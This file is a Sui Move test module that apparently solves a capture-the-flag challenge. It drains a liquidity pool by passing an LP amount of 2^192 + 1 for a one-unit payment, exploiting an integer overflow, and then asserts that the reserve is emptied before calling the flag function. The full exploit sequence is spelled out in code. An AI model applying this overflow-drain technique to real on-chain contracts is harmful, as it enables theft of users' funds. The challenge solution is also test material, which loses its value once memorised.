#[test_only]
module off_by_2_192::pool_tests;

use off_by_2_192::pool;
use sui::coin;
use sui::sui::SUI;
use sui::test_scenario as ts;
use sui::test_utils;

#[test]
fun drains_pool_via_overflow() {
    let attacker = @0xA;
    let mut sc = ts::begin(attacker);

    let seed = coin::mint_for_testing<SUI>(1_000_000, ts::ctx(&mut sc));
    let mut pool = pool::create(seed, ts::ctx(&mut sc));

    let lp_amount: u256 = (1u256 << 192) + 1;
    let mut payment = coin::mint_for_testing<SUI>(1, ts::ctx(&mut sc));
    let lp = pool::add_liquidity(&mut pool, lp_amount, &mut payment, ts::ctx(&mut sc));
    coin::destroy_zero(payment);

    let out = pool::remove_liquidity(&mut pool, lp, ts::ctx(&mut sc));
    assert!(coin::value(&out) >= 999_000, 0);
    assert!(pool::reserve_value(&pool) <= 1_000, 1);
    pool::flag(&pool);
    coin::burn_for_testing(out);

    test_utils::destroy(pool);
    ts::end(sc);
}

#[test]
#[expected_failure]
fun naive_shift_is_rejected() {
    let attacker = @0xA;
    let mut sc = ts::begin(attacker);
    let seed = coin::mint_for_testing<SUI>(1_000_000, ts::ctx(&mut sc));
    let mut pool = pool::create(seed, ts::ctx(&mut sc));

    let mut payment = coin::zero<SUI>(ts::ctx(&mut sc));
    let lp = pool::add_liquidity(&mut pool, 1u256 << 192, &mut payment, ts::ctx(&mut sc));

    pool::share(pool);
    coin::destroy_zero(payment);
    test_utils::destroy(lp);
    ts::end(sc);
}
